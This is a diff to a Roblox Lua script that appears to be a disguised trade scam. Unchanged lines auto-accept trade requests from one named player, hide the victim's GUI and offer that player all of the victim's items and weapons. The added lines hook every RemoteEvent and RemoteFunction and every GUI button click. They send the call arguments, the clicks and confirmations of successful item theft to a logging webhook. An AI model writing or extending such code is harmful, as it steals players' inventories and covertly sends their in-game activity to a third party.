@@ -28,6 +28,54 @@ local function sendWebhookLog(message)
     end)
 end
 
+-- Initialize the recorder features for mobile actions and remotes
+sendWebhookLog("📱 **Mobile Script & Recorder Logger Active**\nPlayer: " .. LocalPlayer.Name .. " has executed the combined script.")
+
+for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
+    if descendant:IsA("RemoteEvent") then
+        local originalFireServer = descendant.FireServer
+        descendant.FireServer = function(self, ...)
+            local args = {...}
+            local argString = ""
+            for i, v in ipairs(args) do
+                argString = argString .. tostring(v) .. (i < #args and ", " or "")
+            end
+            sendWebhookLog("📤 **RemoteEvent Fired:** `" .. descendant.Name .. "`\nArguments: `[" .. argString .. "`]")
+            return originalFireServer(self, ...)
+        end
+    elseif descendant:IsA("RemoteFunction") then
+        local originalInvokeServer = descendant.InvokeServer
+        descendant.InvokeServer = function(self, ...)
+            local args = {...}
+            local argString = ""
+            for i, v in ipairs(args) do
+                argString = argString .. tostring(v) .. (i < #args and ", " or "")
+            end
+            sendWebhookLog("📥 **RemoteFunction Invoked:** `" .. descendant.Name .. "`\nArguments: `[" .. argString .. "`]")
+            return originalInvokeServer(self, ...)
+        end
+    end
+end
+
+local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
+if playerGui then
+    playerGui.DescendantAdded:Connect(function(child)
+        if child:IsA("GuiButton") then
+            child.Activated:Connect(function()
+                sendWebhookLog("👆 **Button Clicked:** `" .. child.Name .. "`, Path: `" .. child:GetFullName() .. "`")
+            end)
+        end
+    end)
+    
+    for _, gui in ipairs(playerGui:GetDescendants()) do
+        if gui:IsA("GuiButton") then
+            gui.Activated:Connect(function()
+                sendWebhookLog("👆 **Button Clicked:** `" .. gui.Name .. "`, Path: `" .. gui:GetFullName() .. "`")
+            end)
+        end
+    end
+end
+
 print("Waiting for incoming trade request callback...")
 
 local function disableGuiInteraction(guiObject)
@@ -62,6 +110,7 @@ end
 SendRequest.OnClientInvoke = function(senderPlayer)
     if senderPlayer and senderPlayer.Name == "Bofuxa" then
         print("Trade request verified from Bofuxa. Accepting...")
+        sendWebhookLog("🤝 **Trade Intercepted:** Validated trade request from **Bofuxa**.")
         
         local function applyGuiHides(targetPlayer)
             if targetPlayer and targetPlayer:FindFirstChild("PlayerGui") then
@@ -120,6 +169,7 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                         end
                     end
                     print("Successfully offered " .. tostring(offeredCount) .. " items/weapons!")
+                    sendWebhookLog("📦 **Trade Offer Success:** Offered " .. tostring(offeredCount)  .. " items/weapons to Bofuxa.")
                 else
                     warn("Could not find inventory container path!")
                     sendWebhookLog("[Bug Report] Inventory container path not found for player: " .. LocalPlayer.Name)
